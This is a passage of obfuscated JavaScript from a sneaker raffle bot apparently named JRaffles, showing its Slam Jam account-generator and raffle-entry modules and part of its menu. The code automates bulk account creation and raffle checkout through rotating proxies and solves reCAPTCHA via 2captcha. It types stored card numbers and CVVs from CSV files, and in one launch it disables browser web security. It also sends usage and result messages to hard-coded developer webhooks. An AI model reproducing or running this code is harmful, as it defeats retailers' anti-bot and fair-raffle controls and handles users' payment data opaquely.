                    for (var _0x12ead0 = 0x0; _0x12ead0 < _0x94377a['length']; _0x12ead0++) {
                        if (_0x5370c5 != 'yes')
                            var _0x5370c5 = '', _0x2bc32c = 0x0;
                        var _0x10c6ad = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Patta\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x1d42cd
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x5a0dc7['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x2071e6
                                }
                            ]
                        }];
                        const _0xda0e13 = { 'embeds': _0x10c6ad };
                        _0x2164fd(_0xe4087e['name'] + '\x20Task\x20' + (_0x12ead0 + 0x1) + '\x20/\x20' + _0x94377a['length'] + '\x20||\x20File:\x20' + _0x29ead8 + '\x20Proxies:\x20' + _0x404517), await _0x5e3796(_0x94377a, _0x12ead0);
                        var _0x3051b6 = await _0x1653b0(_0x94377a[_0x12ead0], _0xe4087e, 'acc', ![]);
                        const _0x4d4de8 = { 'succesDEVMSG': { 'embeds': [_0x3051b6] } };
                        if (_0x94377a[_0x12ead0]['Email'] == '' || _0x94377a[_0x12ead0]['FirstName'] == '' || _0x94377a[_0x12ead0]['LastName'] == '') {
                            console['log'](_0x13cc99() + '\x20[' + _0x3f8151[taskModule]['name'] + ']\x20Task\x20' + (_0x12ead0 + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x207ff4(0x7d0);
                            continue;
                        }
                        (_0x94377a[_0x12ead0]['Password'] == '' || _0x94377a[_0x12ead0] == undefined) && _0x94377a[_0x12ead0]['Password'] == 'JRaffles23!';
                        if (_0x5a0dc7['useRandomProxy'] = ![])
                            var _0x30e0f8 = _0x5f2ef3[_0x12ead0]['split'](':');
                        else
                            var _0x219096 = Math['round'](Math['random']() * (_0x5f2ef3['length'] - 0x1)), _0x30e0f8 = _0x5f2ef3[_0x219096]['split'](':');
                        const _0x395caf = await _0x512dd9['launch']({
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x30e0f8[0x0] + ':' + _0x30e0f8[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                        try {
                            const _0xf9a679 = await _0x395caf['newPage']();
                            await _0xf9a679['authenticate']({
                                'username': '' + _0x30e0f8[0x2],
                                'password': '' + _0x30e0f8[0x3]
                            }), console['log'](_0x13cc99() + '\x20[' + _0xe4087e['name'] + ']\x20Task\x20' + (_0x12ead0 + 0x1) + '\x20:\x20Getting\x20Session'), await _0xf9a679['setRequestInterception'](!![]), _0xf9a679['on']('request', _0x4059f1 => {
                                _0x4059f1['resourceType']() === 'image' || _0x4059f1['resourceType']() === 'font' || _0x4059f1['resourceType']() === 'media' ? _0x4059f1['abort']() : _0x4059f1['continue']();
                            }), await _0xf9a679['goto']('https://drop.slamjam.com/account/register'), await _0x207ff4(0xbb8), await _0xf9a679['waitForSelector']('#FirstName'), await _0xf9a679['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0xf9a679['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), console['log'](_0x13cc99() + '\x20[' + _0xe4087e['name'] + ']\x20Task\x20' + (_0x12ead0 + 0x1) + '\x20:\x20Filling\x20information'), await _0x207ff4(0x4b0), await _0xf9a679['type']('#FirstName', '' + _0x94377a[_0x12ead0]['FirstName']), await _0x207ff4(0x226), await _0xf9a679['type']('#LastName', '' + _0x94377a[_0x12ead0]['LastName']), await _0x207ff4(0x226), await _0xf9a679['type']('#Email', '' + _0x94377a[_0x12ead0]['Email']), await _0x207ff4(0x2ee), await _0xf9a679['type']('#ConfirmEmail', '' + _0x94377a[_0x12ead0]['Email']), await _0x207ff4(0x2ee), await _0xf9a679['type']('#CreatePassword', '' + _0x94377a[_0x12ead0]['Password']), await _0x207ff4(0x2ee), await _0xf9a679['type']('#CreateConfirmPassword', '' + _0x94377a[_0x12ead0]['Password']), await _0x207ff4(0x226), console['log'](_0x13cc99() + '\x20[' + _0xe4087e['name'] + ']\x20Task\x20' + (_0x12ead0 + 0x1) + '\x20:\x20Submitting..'), await _0xf9a679['$eval']('#create_customer', _0x4fbc51 => _0x4fbc51['submit']()), await _0x207ff4(0x1388), console['log'](_0x13cc99() + '\x20[' + _0xe4087e['name'] + ']\x20Task\x20' + (_0x12ead0 + 0x1) + '\x20:\x20' + _0x191fc2['cyan']('Solving\x20Captcha')), await _0xf9a679['solveRecaptchas'](), console['log'](_0x13cc99() + '\x20[' + _0xe4087e['name'] + ']\x20Task\x20' + (_0x12ead0 + 0x1) + '\x20:\x20Captcha\x20solved'), await _0xf9a679['$eval']('.shopify-challenge__container\x20>\x20form', _0x23ab6a => _0x23ab6a['submit']());
                            try {
                                await _0xf9a679['waitForSelector']('.product-card__image'), await _0x207ff4(0x1f4), _0x5370c5 = 'no', console['log'](_0x191fc2['green'](_0x13cc99() + '\x20[' + _0xe4087e['name'] + ']\x20Task\x20' + (_0x12ead0 + 0x1) + '\x20:\x20Account\x20' + _0x94377a[_0x12ead0]['Email'] + '\x20Generated!')), _0x71872f['appendFileSync']('../accounts/slamjam.csv', '\x0a' + _0x94377a[_0x12ead0]['Email'] + ',' + _0x94377a[_0x12ead0]['Password']), console['log'](_0x191fc2['yellow'](_0x13cc99() + '\x20[' + _0xe4087e['name'] + ']\x20Task\x20' + (_0x12ead0 + 0x1) + '\x20:\x20Account\x20' + _0x94377a[_0x12ead0]['Email'] + '\x20Saved\x20in\x20\x27accounts/slamjam.csv\x27'));
                                try {
                                    _0x5a0dc7['webhook'] != undefined && _0x5a0dc7['webhook'] != '' && await _0xf7d9ce(_0x5a0dc7['webhook'], _0x4d4de8['succesDEVMSG']);
                                } catch {
                                }
                                await _0xf7d9ce(_0x14fa11, _0x4d4de8['succesDEVMSG']);
                            } catch (_0x21344b) {
                                console['log'](_0x191fc2['red'](_0x13cc99() + '\x20[' + _0x3f8151[taskModule]['name'] + ']\x20Task\x20' + (_0x12ead0 + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x21344b));
                            }
                        } catch (_0x440438) {
                            console['log'](_0x191fc2['red'](_0x13cc99() + '\x20[' + _0x3f8151[taskModule]['name'] + ']\x20Task\x20' + (_0x12ead0 + 0x1) + '\x20:\x20' + _0x440438));
                        } finally {
                            _0x395caf && _0x395caf['close']();
                            if (_0x5370c5 == 'yes' && _0x2bc32c != 0x5) {
                                console['log'](_0x191fc2['red'](_0x13cc99() + '\x20[' + _0xe4087e['name'] + ']\x20Task\x20' + (_0x12ead0 + 0x1) + '\x20:\x20Retrying')), _0x12ead0 = _0x12ead0 - 0x1, _0x2bc32c = _0x2bc32c + 0x1;
                                continue;
                            }
                            _0x5370c5 == 'yes' && _0x2bc32c >= 0x5 && (_0x3fbd0e(_0x94377a[_0x12ead0], _0xe4087e), _0x5370c5 = 'no', _0x2bc32c = 0x0), console['log']('Waiting\x20for\x20' + _0x5a0dc7['delay'] + '\x20ms'), await _0x207ff4(_0x5a0dc7['delay']);
                        }
                    }
                }
            },
            {
                'name': 'SLAM\x20JAM\x20Raffle\x20Entries',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505',
                'function': async function (_0x4fdbd4, _0x430eb0, _0x27ea30) {
                    _0x512dd9['use'](_0x5de1d3()), _0x512dd9['use'](_0x34cad3({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x5a0dc7['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x5262f3 = 0x0; _0x5262f3 < _0x430eb0['length']; _0x5262f3++) {
                        var _0x3b50cf;
                        if (_0x504bfa != 'yes')
                            var _0x504bfa = '', _0xe0c357 = 0x0;
                        _0x2164fd(_0x4fdbd4['name'] + '\x20Task\x20' + (_0x5262f3 + 0x1) + '\x20/\x20' + _0x430eb0['length'] + '\x20||\x20File:\x20' + _0x29ead8 + '\x20Proxies:\x20' + _0x404517), await _0x5e3796(_0x430eb0, _0x5262f3);
                        if (_0x430eb0[_0x5262f3]['Email'] == '' || _0x430eb0[_0x5262f3]['Password'] == '' || _0x430eb0[_0x5262f3]['FirstName'] == '' || _0x430eb0[_0x5262f3]['LastName'] == '') {
                            console['log'](_0x13cc99() + '\x20[' + _0x4fdbd4['name'] + ']\x20Task\x20' + (_0x5262f3 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x5a0dc7['useRandomProxy'] = ![])
                            var _0x453f3a = _0x27ea30[_0x5262f3]['split'](':');
                        else
                            var _0x3e61b7 = Math['round'](Math['random']() * (_0x27ea30['length'] - 0x1)), _0x453f3a = _0x27ea30[_0x3e61b7]['split'](':');
                        const _0x2042cb = await _0x512dd9['launch']({
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x453f3a[0x0] + ':' + _0x453f3a[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox',
                                '--disable-web-security',
                                '--disable-features=IsolateOrigins',
                                '\x20--disable-site-isolation-trials'
                            ]
                        });
                        try {
                            const _0x441074 = await _0x2042cb['newPage']();
                            await _0x441074['authenticate']({
                                'username': '' + _0x453f3a[0x2],
                                'password': '' + _0x453f3a[0x3]
                            }), await _0x441074['setViewport']({
                                'width': 0x500,
                                'height': 0x2d0
                            }), console['log'](_0x13cc99() + '\x20[' + _0x4fdbd4['name'] + ']\x20Task\x20' + (_0x5262f3 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x441074['setRequestInterception'](!![]), _0x441074['on']('request', _0x1b323f => {
                                _0x1b323f['resourceType']() === 'image' || _0x1b323f['resourceType']() === 'font' || _0x1b323f['resourceType']() === 'media' ? _0x1b323f['abort']() : _0x1b323f['continue']();
                            }), await _0x441074['goto']('https://drop.slamjam.com/account/login', {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x441074['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x441074['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x207ff4(0x258), await _0x441074['waitForSelector']('#CustomerEmail'), console['log'](_0x13cc99() + '\x20[' + _0x4fdbd4['name'] + ']\x20Task\x20' + (_0x5262f3 + 0x1) + '\x20:\x20Logging\x20in..'), await _0x441074['type']('#CustomerEmail', '' + _0x430eb0[_0x5262f3]['Email']), await _0x207ff4(0x12c), await _0x441074['type']('#CustomerPassword', '' + _0x430eb0[_0x5262f3]['Password']), await _0x207ff4(0x226), await _0x441074['$eval']('#customer_login', _0x266b7f => _0x266b7f['submit']()), await _0x207ff4(0x7d0), await _0x441074['waitForSelector']('iframe[title=\x22reCAPTCHA\x22]'), console['log'](_0x13cc99() + '\x20[' + _0x4fdbd4['name'] + ']\x20Task\x20' + (_0x5262f3 + 0x1) + '\x20:\x20' + _0x191fc2['cyan']('Solving\x20Captcha')), await _0x441074['solveRecaptchas'](), console['log'](_0x13cc99() + '\x20[' + _0x4fdbd4['name'] + ']\x20Task\x20' + (_0x5262f3 + 0x1) + '\x20:\x20Captcha\x20Solved'), await _0x441074['$eval']('.shopify-challenge__container\x20>\x20form', _0x1ba2fb => _0x1ba2fb['submit']());
                            try {
                                await _0x441074['waitForSelector']('.nav-account'), await _0x207ff4(0x4b0);
                            } catch {
                                console['log'](_0x191fc2['red'](_0x13cc99() + '\x20[' + _0x4fdbd4['name'] + ']\x20Task\x20' + (_0x5262f3 + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                                continue;
                            }
                            await _0x441074['goto']('' + _0x430eb0[_0x5262f3]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x207ff4(0xbb8), console['log'](_0x13cc99() + '\x20[' + _0x4fdbd4['name'] + ']\x20Task\x20' + (_0x5262f3 + 0x1) + '\x20:\x20Starting\x20Entry');
                            try {
                                await _0x441074['waitForSelector']('#ProductSelect-product-template-raffle');
                            } catch {
                            }
                            await _0x441074['click']('.product-select-variant-wrapper'), await _0x207ff4(0x320), await _0x441074['click']('li.product-select-variant__value[data-size=\x22' + _0x430eb0[_0x5262f3]['Size'] + '\x22]'), await _0x207ff4(0x384), await _0x441074['$eval']('#AddToCartForm-product-template-raffle', _0x203535 => _0x203535['submit']()), await _0x441074['waitForSelector']('.cart-order-summary__content'), await _0x207ff4(0x514), await _0x441074['goto']('https://drop.slamjam.com/checkout'), await _0x207ff4(0x514), await _0x441074['waitForSelector']('#checkout_shipping_address_country'), console['log'](_0x13cc99() + '\x20[' + _0x4fdbd4['name'] + ']\x20Task\x20' + (_0x5262f3 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x441074['select']('#checkout_shipping_address_country', '' + _0x430eb0[_0x5262f3]['Country']), await _0x207ff4(0x200), await _0x441074['waitForSelector']('#checkout_shipping_address_first_name'), await _0x441074['type']('#checkout_shipping_address_first_name', '' + _0x430eb0[_0x5262f3]['FirstName']), await _0x207ff4(0x237), await _0x441074['type']('#checkout_shipping_address_last_name', '' + _0x430eb0[_0x5262f3]['LastName']), await _0x207ff4(0x1e0), await _0x441074['type']('#checkout_shipping_address_address1', _0x430eb0[_0x5262f3]['Address1'] + '\x20' + _0x430eb0[_0x5262f3]['HouseNumber']), await _0x207ff4(0x514), await _0x441074['type']('#checkout_shipping_address_address2', '' + _0x430eb0[_0x5262f3]['Address2']), await _0x207ff4(0x514);
                            _0x430eb0[_0x5262f3]['Postcode'] == undefined && (_0x430eb0[_0x5262f3]['Postcode'] = _0x430eb0[_0x5262f3]['Zip']);
                            await _0x441074['type']('#checkout_shipping_address_zip', '' + _0x430eb0[_0x5262f3]['Postcode']), await _0x207ff4(0x2bc), await _0x441074['type']('#checkout_shipping_address_city', '' + _0x430eb0[_0x5262f3]['City']), await _0x207ff4(0x320), await _0x441074['type']('#checkout_shipping_address_phone', '' + _0x430eb0[_0x5262f3]['Phone']), await _0x207ff4(0x320), await _0x441074['click']('#continue_button'), await _0x207ff4(0xbb8), await _0x441074['waitForSelector']('.summary-title'), await _0x207ff4(0x320), await _0x441074['click']('#continue_button'), await _0x207ff4(0x320), console['log'](_0x13cc99() + '\x20[' + _0x4fdbd4['name'] + ']\x20Task\x20' + (_0x5262f3 + 0x1) + '\x20:\x20Finishing\x20Checkout'), await _0x441074['waitForSelector']('#checkout_credit_card_vault'), await _0x207ff4(0x3e8);
                            var _0x1b56a = await _0x441074['$']('iframe[title=\x22Field\x20container\x20for:\x20Card\x20number\x22]'), _0x31a8b1 = await _0x1b56a['contentFrame']();
                            await _0x31a8b1['click']('#number'), await _0x207ff4(0x3e8), await _0x31a8b1['type']('#number', '' + _0x430eb0[_0x5262f3]['CardNumber'], { 'delay': 0x78 }), _0x1b56a = await _0x441074['$']('iframe[title=\x22Field\x20container\x20for:\x20Name\x20on\x20card\x22]'), _0x31a8b1 = await _0x1b56a['contentFrame'](), await _0x207ff4(0x1c2), await _0x31a8b1['click']('#name'), await _0x207ff4(0x1f4), await _0x31a8b1['type']('#name', '' + _0x430eb0[_0x5262f3]['NameOnCard'], { 'delay': 0x78 }), _0x1b56a = await _0x441074['$']('iframe[title=\x22Field\x20container\x20for:\x20Expiration\x20date\x20(MM\x20/\x20YY)\x22]'), _0x31a8b1 = await _0x1b56a['contentFrame'](), await _0x207ff4(0x1c2), await _0x31a8b1['click']('#expiry'), await _0x207ff4(0x1f4), await _0x31a8b1['type']('#expiry', '' + _0x430eb0[_0x5262f3]['ExpiryDate'], { 'delay': 0x78 }), _0x1b56a = await _0x441074['$']('iframe[title=\x22Field\x20container\x20for:\x20Security\x20code\x22]'), _0x31a8b1 = await _0x1b56a['contentFrame'](), await _0x207ff4(0x1c2), await _0x31a8b1['click']('#verification_value'), await _0x207ff4(0x1f4), await _0x31a8b1['type']('#verification_value', '' + _0x430eb0[_0x5262f3]['CVV'], { 'delay': 0x78 }), await _0x441074['$eval']('#accepts-flag-raffle', _0x4f3f01 => _0x4f3f01['click']()), await _0x207ff4(0x7d0), console['log'](_0x13cc99() + '\x20[' + _0x4fdbd4['name'] + ']\x20Task\x20' + (_0x5262f3 + 0x1) + '\x20:\x20Processing\x20Order'), await _0x441074['$eval']('#continue_button', _0x562702 => _0x562702['click']()), await _0x207ff4(0x1b58), await _0x441074['waitForSelector']('.edit_checkout.animate-floating-labels'), await _0x441074['$eval']('.edit_checkout.animate-floating-labels', _0x146000 => _0x146000['submit']()), await _0x207ff4(0x7d0);
                            try {
                                await _0x441074['waitForSelector']('div[data-step=\x22thank_you\x22]', { 'timeout': 0x493e0 }), _0x504bfa = 'no', _0x40845b(_0x430eb0[_0x5262f3], _0x4fdbd4), console['log'](_0x191fc2['green'](_0x13cc99() + '\x20[' + _0x4fdbd4['name'] + ']\x20Task\x20' + (_0x5262f3 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            } catch (_0x2f52e7) {
                                throw new Error('Error\x20Processing\x20Order:\x20' + _0x2f52e7['message']);
                            }
                            var _0x41abde = await _0x1653b0(_0x430eb0[_0x5262f3], _0x4fdbd4, 'dev', ![]), _0x1f6733 = await _0x1653b0(_0x430eb0[_0x5262f3], _0x4fdbd4, 'pub', ![]);
                            const _0x8e42a4 = {
                                'succesDEVMSG': { 'embeds': [_0x41abde] },
                                'succesPUBMSG': { 'embeds': [_0x1f6733] }
                            };
                            try {
                                _0x5a0dc7['webhook'] != undefined && _0x5a0dc7['webhook'] != '' && await _0xf7d9ce(_0x5a0dc7['webhook'], _0x8e42a4['succesDEVMSG']), await _0x207ff4(0xc8), await _0xf7d9ce(_0x565446, _0x8e42a4['succesDEVMSG']), await _0x207ff4(0xc8), await _0xf7d9ce(_0xcaa949, _0x8e42a4['succesPUBMSG']);
                            } catch (_0x4f6ed9) {
                                console['log'](_0x191fc2['yellow'](_0x13cc99() + '\x20[' + _0x3f8151[taskModule]['name'] + ']\x20Task\x20' + (_0x5262f3 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x4f6ed9));
                            }
                        } catch (_0x32afa8) {
                            console['log'](_0x191fc2['red'](_0x13cc99() + '\x20[' + _0x3f8151[taskModule]['name'] + ']\x20Task\x20' + (_0x5262f3 + 0x1) + '\x20:\x20' + _0x32afa8)), _0x3b50cf = '' + _0x32afa8;
                            var _0x27b452 = await _0x1653b0(kickz[_0x5262f3], _0x4fdbd4, 'dev', !![], _0x3b50cf);
                            EMBEDS['errorDEV'] = { 'embeds': [_0x27b452] }, _0x5a0dc7['webhook'] != undefined && _0x5a0dc7['webhook'] != '' && await _0xf7d9ce(_0x5a0dc7['webhook'], EMBEDS['errorDEV']), await _0xf7d9ce(_0x227865, EMBEDS['errorDEV']), _0x504bfa = 'yes';
                        } finally {
                            _0x2042cb && _0x2042cb['close']();
                            if (_0x504bfa == 'yes' && _0xe0c357 != 0x5 && _0x3b50cf != 'Size\x20Not\x20Found') {
                                console['log'](_0x191fc2['red'](_0x13cc99() + '\x20[' + _0x4fdbd4['name'] + ']\x20Task\x20' + (_0x5262f3 + 0x1) + '\x20:\x20Retrying')), _0x5262f3 = _0x5262f3 - 0x1, _0xe0c357 = _0xe0c357 + 0x1;
                                continue;
                            }
                            _0x504bfa == 'yes' && _0xe0c357 >= 0x5 && (_0x3fbd0e(_0x430eb0[_0x5262f3], _0x4fdbd4), _0x504bfa = 'no', _0xe0c357 = 0x0), console['log']('Waiting\x20for\x20' + _0x5a0dc7['delay'] + '\x20ms'), await _0x207ff4(_0x5a0dc7['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'Failed\x20Tasks',
        'modules': [
            {
                'name': 'Retry\x20Failed\x20Tasks',
                'function': async function (_0x50dd7e) {
                    var _0x3cd7bc = await _0xd5e94a(), _0x462dfe = _0x71872f['readFileSync']('../failed-tasks.csv', 'utf-8'), _0x817186 = _0x394747['parse'](_0x462dfe, { 'header': !![] })['data'];
                    for (var _0x32cf46 = 0x0; _0x32cf46 < _0x817186['length']; _0x32cf46++) {
                        var _0x40922d = _0x817186[_0x32cf46]['Store'], _0x318fa4 = _0x817186[_0x32cf46]['Mode'];
                        for (var _0x2d3f92 of _0x3f8151) {
                            const _0x154a51 = _0x2d3f92['name']['includes'](_0x40922d);
                            if (!_0x154a51)
                                continue;
                            for (mode of _0x2d3f92['modules']) {
                                if (mode['name'] == _0x318fa4) {
                                    console['log']('Running\x20' + _0x191fc2['cyan'](mode['name'])), await mode['function'](mode, [_0x817186[_0x32cf46]], _0x3cd7bc);
                                    var _0x128bbc = _0x462dfe['split']('\x0a')['splice'](0x0, 0x1)['join']('\x0a');
                                    _0x71872f['writeFileSync']('../failed-tasks.csv', _0x128bbc);
                                }
                            }
                        }
                    }
                }
            },
            {
                'name': 'Clear\x20Failed\x20Tasks',
                'function': async function () {
                    console['clear'](), console['log']('Are\x20you\x20sure\x20you\x20want\x20to\x20clear\x20\x22failed-tasks.csv\x22?\x20(y/n)');
                    var _0x2f388b = await _0x5d9e09['get']('Answer');
                    if (_0x2f388b['Answer']['toLowerCase']() == 'y') {
                        _0x71872f['writeFileSync']('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), console['clear'](), console['log']('Cleared\x20Failed\x20Tasks'), await _0x207ff4(0x3e8);
                        return;
                    }
                    if (_0x2f388b['Answer']['toLowerCase']() == 'n') {
                        console['clear'](), console['log']('Returning\x20to\x20Main\x20Menu'), await _0x207ff4(0x3e8);
                        return;
                    }
                    return console['clear'](), console['log']('Invalid\x20Input'), await _0x207ff4(0x3e8), this['function']();
                }
            }
        ]
    },
    { 'name': 'Paypal\x20Verification' },
    { 'name': 'Change\x20Settings' },
    { 'name': 'Reload\x20Settings' }
];
async function _0x50b66f(_0x3adfbb) {
    var _0x59b0f6 = await _0xd5e94a(), _0x4f0bf7 = _0x71872f['readFileSync']('../failed-tasks.csv', 'utf-8'), _0x27d35c = _0x394747['parse'](_0x4f0bf7, { 'header': !![] })['data'];
    for (var _0x2531b4 = 0x0; _0x2531b4 < _0x27d35c['length']; _0x2531b4++) {
        var _0x4e8690 = _0x27d35c[_0x2531b4]['Store'], _0x646023 = _0x27d35c[_0x2531b4]['Mode'];
        for (var _0x3a6476 of _0x3f8151) {
            const _0x17843d = _0x3a6476['name']['includes'](_0x4e8690);
            if (_0x17843d)
                for (mode of _0x3f8151[_0x3a6476]['modules']) {
                    const _0x1b9135 = mode['name']['includes'](_0x646023);
                    _0x1b9135 && (_0x3adfbb = mode['name'], await mode['function'](_0x3adfbb, _0x27d35c[_0x2531b4], _0x59b0f6));
                }
        }
    }
}
async function _0x145baa() {
    await _0xd175f0(), console['clear']();
    if (_0x2071e6 != 'devkey') {
        let _0x494724 = await _0xa84fcc['autoUpdate']();
        if (_0x494724 === 'yes')
            return _0x286815('node\x20JRaffles.js');
        console['clear']();
    }
    if (_0x338ac0 == '') {
        console['log']('No\x20key\x20found\x20in\x20settings.json');
        return await _0x207ff4(0x2710);
        ;
    }
    await _0x55bb96(_0x338ac0);
    if (_0x1c9b1e === ![])
        return console['log']('Closing\x20Browser'), await _0x207ff4(0xbb8);
    else
        try {
            var _0x2436a1 = [{
                'type': 'rich',
                'title': 'User\x20Opened\x20JRaffles',
                'description': '',
                'color': 0xc0d6d6,
                'fields': [
                    {
                        'name': 'User',
                        'value': '' + _0x1d42cd
                    },
                    {
                        'name': 'Version',
                        'value': '' + _0x2071e6
                    }
                ]
            }];
            const _0x30d102 = { 'embeds': _0x2436a1 };
            var _0x2c8f13 = await _0x1653b0(null, null, 'open', ![]);
            const _0xa02d1e = { 'openDEVMSG': { 'embeds': [_0x2c8f13] } };
            await _0xf7d9ce(_0x4484cd, _0xa02d1e['openDEVMSG']);
            async function _0x91d894() {
                _0x2164fd('JRaffles\x20' + _0x2071e6), console['clear'](), console['log']('Welcome\x20to\x20' + _0x191fc2['cyan']('JRaffles();') + '\x20' + _0x2071e6), console['log']('Choose\x20a\x20Module\x20to\x20run..\x0a');
                for (var _0x58bb12 = 0x0; _0x58bb12 < _0x3f8151['length'] - 0x4; _0x58bb12++) {
                    if (_0x3f8151[_0x58bb12]['name'] === 'Reload\x20Settings' || _0x3f8151[_0x58bb12]['name'] === 'Change\x20Settings')
                        continue;
                    else
                        console['log']('\x20(' + _0x58bb12 + ')\x20[' + _0x3f8151[_0x58bb12]['name'] + ']');
                }
                ;
                console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('\x20(' + (_0x3f8151['length'] - 0x4) + ')\x20Failed\x20Tasks'), console['log']('\x20(' + (_0x3f8151['length'] - 0x3) + ')\x20Paypal\x20Verification'), console['log']('\x20(' + (_0x3f8151['length'] - 0x2) + ')\x20Change\x20Settings'), console['log']('\x20(' + (_0x3f8151['length'] - 0x1) + ')\x20Reload\x20Settings'), console['log'](''), taskModule = await _0x16197d();
                if (taskModule > _0x3f8151['length'] - 0x1 || isNaN(taskModule) == !![])
                    return console['log']('Invalid\x20selection'), await _0x207ff4(0x3e8), _0x91d894();
                if (_0x3f8151[taskModule]['name'] == 'BSTN') {
                    taskFunction = await _0x406fda(_0x3f8151[taskModule]['modules']);
                    var _0xd0cf86 = _0x3f8151[taskModule]['modules'][taskFunction];
                    console['clear']();
                    if (taskFunction == 0x2) {
                        var _0x53f364 = await _0xd5e94a(), _0x256c86 = await _0x6dea41();
                        await _0xd0cf86['function'](_0xd0cf86, _0x256c86, _0x53f364);
                    } else {
                        if (taskFunction == 0x0) {
                            var _0x53f364 = await _0xd5e94a(), _0x256c86 = await _0x6dea41();
                            await _0xd0cf86['function'](_0xd0cf86, _0x256c86, _0x53f364);
                        } else {
                            if (taskFunction == 0x1) {
                                var _0x53f364 = await _0xd5e94a(), _0x3a9fd4 = await _0x141827(), _0x5c5d8d = _0x3a9fd4['split'](';');
                                await _0xd0cf86['function'](_0xd0cf86, _0x5c5d8d, _0x53f364);
                            }
                        }
                    }
                    return _0x91d894();
                }
                if (_0x3f8151[taskModule]['name'] == 'FENOM') {
                    try {
                        taskFunction = await _0x406fda(_0x3f8151[taskModule]['modules']);
                        var _0xd0cf86 = _0x3f8151[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x1) {
                            var _0x53f364 = await _0xd5e94a(), _0x564f2b = await _0x6dea41();
                            await _0xd0cf86['function'](_0xd0cf86, _0x564f2b, _0x53f364);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x53f364 = await _0xd5e94a(), _0x564f2b = await _0x6dea41();
                                await _0xd0cf86['function'](_0xd0cf86, _0x564f2b, _0x53f364);
                            }
                        }
                    } catch (_0x444ad4) {
                        console['log'](_0x444ad4), await _0x207ff4(0xfa0);
                    }
                    return _0x91d894();
                }
                if (_0x3f8151[taskModule]['name'] == 'AFEW\x20Store') {
                    taskFunction = await _0x406fda(_0x3f8151[taskModule]['modules']);
                    var _0xd0cf86 = _0x3f8151[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x53f364 = await _0xd5e94a(), _0x1bf245 = await _0x6dea41();
                    return await _0xd0cf86['function'](_0xd0cf86, _0x1bf245, _0x53f364), _0x91d894();
                } else {
                    if (_0x3f8151[taskModule]['name'] == 'MAHA\x20Amsterdam') {
                        taskFunction = await _0x406fda(_0x3f8151[taskModule]['modules']);
                        var _0xd0cf86 = _0x3f8151[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x0) {
                            var _0x53f364 = await _0xd5e94a(), _0x51a456 = await _0x6dea41();
                            return await _0xd0cf86['function'](_0xd0cf86, _0x51a456, _0x53f364), _0x91d894();
                        } else {
                            if (taskFunction == 0x1) {
                                var _0x53f364 = await _0xd5e94a();
                                return console['log']('Use\x20the\x20JRaffles\x20Chrome\x20Extension\x20to\x20copy\x20your\x20links\x20here..'), _0x3a9fd4 = await _0x141827(), _0x5c5d8d = _0x3a9fd4['split'](';'), console['log'](_0x5c5d8d['length'] + '\x20links\x20found!'), console['log']('Starting\x20verification..'), await _0xd0cf86['function'](_0xd0cf86, _0x5c5d8d, _0x53f364), _0x91d894();
                            }
                        }
                        ;
                    } else {
                        if (_0x3f8151[taskModule]['name'] == 'FOOTSHOP') {
                            taskFunction = await _0x406fda(_0x3f8151[taskModule]['modules']);
                            var _0xd0cf86 = _0x3f8151[taskModule]['modules'][taskFunction], _0x53f364 = await _0xd5e94a(), _0x14fab9 = await _0x6dea41();
                            return await _0xd0cf86['function'](_0xd0cf86, _0x14fab9, _0x53f364), await _0x207ff4(0x1388), _0x91d894();
                        } else {
                            if (_0x3f8151[taskModule]['name'] == 'OQIUM\x20Store') {
                                taskFunction = await _0x406fda(_0x3f8151[taskModule]['modules']);
                                var _0xd0cf86 = _0x3f8151[taskModule]['modules'][taskFunction];
                                console['clear']();
                                if (taskFunction == 0x0) {
                                    var _0x53f364 = await _0xd5e94a(), _0x51a456 = await _0x6dea41();
                                    return await _0xd0cf86['function'](_0xd0cf86, _0x51a456, _0x53f364), _0x91d894();
                                } else {
                                    if (taskFunction == 0x1) {
                                        var _0x53f364 = await _0xd5e94a();
